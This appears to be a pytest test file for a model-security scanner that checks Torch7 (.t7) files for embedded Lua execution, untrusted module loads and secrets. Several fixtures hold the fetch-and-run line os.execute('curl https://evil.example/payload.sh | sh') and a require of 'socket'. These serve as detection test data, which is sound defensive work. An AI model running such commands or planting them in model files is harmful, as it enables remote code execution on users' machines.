"""Tests for Torch7 scanner support."""

from __future__ import annotations

from pathlib import Path

import pytest

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.torch7_scanner import Torch7Scanner


def _write_torch7_file(tmp_path: Path, payload: bytes, filename: str = "model.t7") -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def test_can_handle_valid_torch7_file(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential model_name=resnet\n"
    path = _write_torch7_file(tmp_path, payload)

    assert Torch7Scanner.can_handle(str(path))


def test_can_handle_valid_torch7_file_with_misleading_suffix(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential model_name=resnet\n"
    path = _write_torch7_file(tmp_path, payload, filename="payload.jpg")

    assert Torch7Scanner.can_handle(str(path))


def test_can_handle_rejects_non_torch7_content(tmp_path: Path) -> None:
    path = _write_torch7_file(tmp_path, b"this is not a torch7 file", filename="fake.t7")

    assert not Torch7Scanner.can_handle(str(path))


def test_can_handle_rejects_pytorch_source_markers(tmp_path: Path) -> None:
    path = _write_torch7_file(
        tmp_path,
        b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
        filename="source.t7",
    )

    assert not Torch7Scanner.can_handle(str(path))


def test_scan_detects_execution_in_ascii_serialized_torch7(tmp_path: Path) -> None:
    payload = (
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="ascii-malicious.t7")

    assert Torch7Scanner.can_handle(str(path))

    result = Torch7Scanner().scan(str(path))
    execution_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(execution_findings) == 1
    assert execution_findings[0].severity == IssueSeverity.CRITICAL


def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="malicious.t7")

    result = Torch7Scanner().scan(str(path))
    execution_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(execution_findings) == 1
    assert execution_findings[0].severity == IssueSeverity.CRITICAL


def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> None:
    secret_value = "SENSITIVEVALUE1234567890"
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
        + f"cmd = os.execute('curl https://evil.example/payload.sh?token={secret_value} | sh')\n".encode()
        + f"client_secret = {secret_value}\n".encode()
    )
    path = _write_torch7_file(tmp_path, payload, filename="redacted.t7")

    result = Torch7Scanner().scan(str(path))

    serialized = repr([check.details for check in result.checks])
    assert result.success is False
    assert secret_value not in serialized
    assert "token=<redacted>" in serialized
    assert "client_secret = <redacted>" in serialized
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
        b"cmd = os.execute('curl https://evil.example/public/payload.sh | sh')\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="benign-url.t7")

    result = Torch7Scanner().scan(str(path))

    execution_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(execution_findings) == 1
    examples = execution_findings[0].details["examples"]
    assert any("https://evil.example/public/payload.sh" in example for example in examples)
    assert all("<redacted>" not in example for example in examples)


def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\n-- decoy comment token\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="malicious-comment.t7")

    result = Torch7Scanner().scan(str(path))
    execution_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(execution_findings) == 1
    assert execution_findings[0].severity == IssueSeverity.CRITICAL


def test_scan_detects_bare_string_require_for_untrusted_module(tmp_path: Path) -> None:
    payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require "socket"\n'
    path = _write_torch7_file(tmp_path, payload, filename="bare-require.t7")

    result = Torch7Scanner().scan(str(path))

    dynamic_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(dynamic_findings) == 1
    assert dynamic_findings[0].severity == IssueSeverity.WARNING


def test_scan_detects_long_bracket_require_for_untrusted_module(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require [[socket]]\n"
    path = _write_torch7_file(tmp_path, payload, filename="long-bracket-require.t7")

    result = Torch7Scanner().scan(str(path))

    dynamic_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(dynamic_findings) == 1
    assert dynamic_findings[0].severity == IssueSeverity.WARNING


def test_scan_detects_comment_separated_bare_require(tmp_path: Path) -> None:
    payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal mod = require -- decoy\n"socket"\n'
    path = _write_torch7_file(tmp_path, payload, filename="commented-bare-require.t7")

    result = Torch7Scanner().scan(str(path))

    dynamic_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(dynamic_findings) == 1
    assert dynamic_findings[0].severity == IssueSeverity.WARNING


def test_scan_allows_bare_string_require_for_safe_module(tmp_path: Path) -> None:
    payload = b'T7\x00\x00torch.FloatTensor nn.Sequential\nlocal torch = require "torch"\n'
    path = _write_torch7_file(tmp_path, payload, filename="safe-bare-require.t7")

    result = Torch7Scanner().scan(str(path))

    dynamic_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
    ]
    assert dynamic_findings == []


def test_scan_allows_long_bracket_require_for_safe_module(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\nlocal torch = require [[torch]]\n"
    path = _write_torch7_file(tmp_path, payload, filename="safe-long-bracket-require.t7")

    result = Torch7Scanner().scan(str(path))

    dynamic_findings = [
        check
        for check in result.checks
        if check.name == "Torch7 Dynamic Module Load Analysis" and check.status == CheckStatus.FAILED
    ]
    assert dynamic_findings == []


def test_scan_handles_corrupt_file_gracefully(tmp_path: Path) -> None:
    path = _write_torch7_file(tmp_path, b"NOT7", filename="corrupt.t7")

    result = Torch7Scanner().scan(str(path))
    header_failures = [check for check in result.checks if check.name == "Torch7 Header Signature"]
    assert len(header_failures) == 1
    assert header_failures[0].status == CheckStatus.FAILED


def test_scan_bounded_torch7_window_is_inconclusive(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n" + (b"safe\n" * 64)
    path = _write_torch7_file(tmp_path, payload, filename="bounded.t7")

    result = Torch7Scanner(config={"torch7_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "torch7_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
    assert result.success is False


def test_scan_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = _write_torch7_file(tmp_path, b"T7\x00\x00torch.FloatTensor nn.Sequential safe metadata")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated Torch7 read failure")

    monkeypatch.setattr(Torch7Scanner, "can_handle", classmethod(lambda _cls, _path: True))
    monkeypatch.setattr("modelaudit.scanners.torch7_scanner.open", raise_os_error, raising=False)

    direct = Torch7Scanner().scan(str(path))
    read_checks = [check for check in direct.checks if check.name == "Torch7 File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "torch7_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "torch7_read_failed" in direct.metadata["scan_outcome_reasons"]

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert "torch7_read_failed" in metadata["scan_outcome_reasons"]
            assert not [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_string_extraction_limit_marks_late_torch7_payload_inconclusive(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\x00safe_fragment\x00"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\x00"
    )
    path = _write_torch7_file(tmp_path, payload, filename="late-payload.t7")

    result = Torch7Scanner(config={"torch7_max_extracted_strings": 2}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "torch7_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "Torch7 Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert "stopped at the configured extraction limit" in budget_checks[0].message
    assert budget_checks[0].details["analysis_incomplete"] is True

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            torch7_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            torch7_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_string_extraction_exact_limit_preserves_clean_torch7_result(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\x00safe_fragment\x00"
    path = _write_torch7_file(tmp_path, payload, filename="exact-limit.t7")

    result = Torch7Scanner(config={"torch7_max_extracted_strings": 2}).scan(str(path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "Torch7 Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_regression_torch7_routes_to_dedicated_scanner(tmp_path: Path) -> None:
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
    path = _write_torch7_file(tmp_path, payload, filename="route.t7")

    result = core.scan_file(str(path))
    assert result.scanner_name == "torch7"
    assert result.scanner_name != "unknown"


def test_false_positive_execute_word_without_call_not_critical(tmp_path: Path) -> None:
    payload = (
        b"T7\x00\x00torch.FloatTensor nn.Sequential\nlabel=execute_mode_fast\ndescription=network_ready_classifier\n"
    )
    path = _write_torch7_file(tmp_path, payload, filename="labels.t7")

    result = Torch7Scanner().scan(str(path))
    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_false_positive_numeric_tensor_blob_not_flagged_as_exec(tmp_path: Path) -> None:
    numeric_blob = b"".join(int(i).to_bytes(2, "little", signed=False) for i in range(64))
    payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\n" + numeric_blob
    path = _write_torch7_file(tmp_path, payload, filename="tensor.th")

    result = Torch7Scanner().scan(str(path))
    exec_failures = [
        check
        for check in result.checks
        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
    ]
    assert len(exec_failures) == 0
